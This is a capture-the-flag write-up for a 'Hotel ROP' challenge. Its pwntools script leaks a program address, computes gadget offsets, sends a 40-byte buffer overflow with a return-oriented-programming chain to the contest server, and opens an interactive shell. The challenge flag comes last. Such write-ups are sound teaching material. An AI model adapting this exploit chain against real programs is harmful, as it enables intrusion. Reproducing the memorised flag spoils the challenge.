# Hotel ROP

## Description

They say programmers' dream is California. And because they need somewhere to stay, we've built a hotel!

`nc dctf1-chall-hotel-rop.westeurope.azurecontainer.io 7480`

[hotel_rop](hotel_rop)

## Solution

```python
from pwn import *

nc = remote('dctf1-chall-hotel-rop.westeurope.azurecontainer.io', 7480)

nc.recvuntil('street ')
main = int(nc.recvlineS(), 0)

offset  = main   - 0x10136d

pop_rdi = offset + 0x10140b
pop_rsi = offset + 0x101409

rop1    = offset + 0x1011dc
rop2    = offset + 0x101283
rop3    = offset + 0x101185

log.info(f"Program @ {hex(offset)}")

payload = [
    b'A' * 40,
    p64(rop1),
    p64(rop2),
    p64(pop_rdi),
    p64(0x1337c0de),
    p64(pop_rsi),
    p64(0xffffffffcb760000),
    p64(0xffffffffcb760000),
    p64(rop3),
]

nc.recvline()
nc.sendline(b''.join(payload))

nc.interactive()
```

#### **FLAG >>** `dctf{ch41n_0f_h0t3ls}`